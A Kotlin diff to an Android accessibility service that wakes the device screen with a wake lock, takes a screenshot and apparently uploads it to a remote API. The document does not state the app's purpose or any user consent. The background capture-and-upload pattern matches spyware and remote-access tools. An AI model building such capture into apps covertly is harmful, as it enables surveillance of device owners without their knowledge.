@@ -4,6 +4,7 @@ import android.accessibilityservice.AccessibilityService
 import android.content.Context
 import android.graphics.Bitmap
 import android.os.Build
+import android.os.PowerManager
 import android.provider.Settings
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
@@ -11,7 +12,9 @@ import com.bg.api.RetrofitClient
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
+import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
+import kotlinx.coroutines.withContext
 import java.io.File
 import java.io.FileOutputStream
 
@@ -36,39 +39,59 @@ class BgAccessibilityService : AccessibilityService() {
 
     fun captureAndUpload() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-            takeScreenshot(
-                android.view.Display.DEFAULT_DISPLAY,
-                mainExecutor,
-                object : TakeScreenshotCallback {
-                    override fun onSuccess(screenshot: ScreenshotResult) {
-                        val hardwareBuffer = screenshot.hardwareBuffer
-                        val colorSpace = screenshot.colorSpace
-                        serviceScope.launch {
-                            try {
-                                val bitmap = Bitmap.wrapHardwareBuffer(hardwareBuffer, colorSpace)
-                                hardwareBuffer.close()
-                                if (bitmap != null) {
-                                    val file = saveBitmapToFile(bitmap)
-                                    bitmap.recycle()
-                                    if (file != null) uploadScreenshot(file)
-                                    else Log.e(TAG, "Failed to save bitmap to file")
-                                } else {
-                                    Log.e(TAG, "wrapHardwareBuffer returned null")
+            serviceScope.launch {
+                val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
+                @Suppress("DEPRECATION")
+                val wakeLock = pm.newWakeLock(
+                    PowerManager.SCREEN_BRIGHT_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP,
+                    "Bg:Screenshot"
+                )
+                wakeLock.acquire(10_000)
+                delay(500)
+                withContext(Dispatchers.Main) {
+                    takeScreenshot(
+                        android.view.Display.DEFAULT_DISPLAY,
+                        mainExecutor,
+                        object : TakeScreenshotCallback {
+                            override fun onSuccess(screenshot: ScreenshotResult) {
+                                releaseWakeLock(wakeLock)
+                                val hardwareBuffer = screenshot.hardwareBuffer
+                                val colorSpace = screenshot.colorSpace
+                                serviceScope.launch {
+                                    try {
+                                        val bitmap = Bitmap.wrapHardwareBuffer(hardwareBuffer, colorSpace)
+                                        hardwareBuffer.close()
+                                        if (bitmap != null) {
+                                            val file = saveBitmapToFile(bitmap)
+                                            bitmap.recycle()
+                                            if (file != null) uploadScreenshot(file)
+                                            else Log.e(TAG, "Failed to save bitmap to file")
+                                        } else {
+                                            Log.e(TAG, "wrapHardwareBuffer returned null")
+                                        }
+                                    } catch (e: Exception) {
+                                        Log.e(TAG, "Screenshot processing failed", e)
+                                    }
                                 }
-                            } catch (e: Exception) {
-                                Log.e(TAG, "Screenshot processing failed", e)
+                            }
+
+                            override fun onFailure(errorCode: Int) {
+                                releaseWakeLock(wakeLock)
+                                Log.e(TAG, "Screenshot capture failed with errorCode=$errorCode")
                             }
                         }
-                    }
-
-                    override fun onFailure(errorCode: Int) {
-                        Log.e(TAG, "Screenshot capture failed with errorCode=$errorCode")
-                    }
+                    )
                 }
-            )
+            }
         } else {
             Log.e(TAG, "takeScreenshot requires Android 11+ (API 30)")
         }
+    }
+
+    private fun releaseWakeLock(wakeLock: PowerManager.WakeLock) {
+        try {
+            if (wakeLock.isHeld) wakeLock.release()
+        } catch (_: Exception) { }
     }
 
     private fun saveBitmapToFile(bitmap: Bitmap): File? {
